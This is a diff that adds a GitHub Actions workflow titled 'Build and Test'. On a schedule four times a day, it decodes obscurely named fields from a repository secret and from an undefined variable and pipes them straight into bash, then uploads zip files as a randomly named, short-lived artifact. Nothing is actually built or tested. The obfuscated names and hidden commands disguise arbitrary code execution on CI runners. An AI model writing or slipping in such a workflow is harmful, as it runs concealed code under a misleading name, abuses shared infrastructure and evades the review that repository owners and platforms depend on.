@@ -1,0 +1,28 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '17 3,9,15,21 * * *'
+env:
+  CI: true
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          g99: ${{ secrets.g99 }}
+        run: |
+          printf '%s' "$g99" | jq -r .boqcr30 | /bin/bash
+          printf '%s' "$rcpd3" | jq -r .e306 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: bIdIMLwO
+          path: "*.zip"
+          retention-days: 1
